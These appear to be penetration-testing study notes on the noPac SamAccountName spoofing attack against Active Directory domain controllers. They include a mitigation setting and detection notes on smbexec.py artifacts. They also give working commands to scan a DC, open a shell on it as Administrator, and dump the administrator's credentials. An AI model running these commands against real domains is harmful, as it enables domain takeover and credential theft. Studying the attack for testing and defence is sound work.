SamAccountName spoofing
- change the SamAccountName of a computer to that of a Domain Controller
- one mitigation is to set the value of ms-DS-MachineAccountQuota = 0
    
    - setting this to 0 can prevent quite a few AD attacks
    
  
test if the DC is vulnerable with noPac scanner
```JavaScript
python3 scanner.py <DOMAIN>/<user>:<pass> -dc-ip <IP> -use-ldap
```
  
Impersonate the built-in Administrator account to drop a semi-interactive shell on DC
- can be noisy and blocked by AV/EDR
```JavaScript
python3 noPac.py <DOMAIN>/<user>:<pass> -dc-ip <IP> -dc-host <machine_name> -shell --impersonate administrator -use-ldap
```
![image 366.png](../../assets/NoPac/image%20366.png)
- uses [smbexec.py](http://smbexec.py) shell
    
    - need to use exact path instead of navigating with cd
    
  
running noPac will also save the TGT on attack host, which we can use to secretsdump
![image 1 274.png](../../assets/NoPac/image%201%20274.png)
  
can dump with noPac.py
```JavaScript
python3 noPac.py <DOMAIN>/<user>:<pass> -dc-ip <IP> -dc-host <machine_name> --impersonate administrator -use-ldap -dump -just-dc-user <DOMAIN>/administrator
```
![image 2 233.png](../../assets/NoPac/image%202%20233.png)
  
[smbexec.py](http://smbexec.py) creates services called BTOBTO and BTOBO
- for any command, it sends to the target over SMB inside a .bat file called execute.bat and echoes the command to a temporary file before running it then deleting it
    
    - looks very suspicious in Windows Defender logs
    
![image 3 201.png](../../assets/NoPac/image%203%20201.png)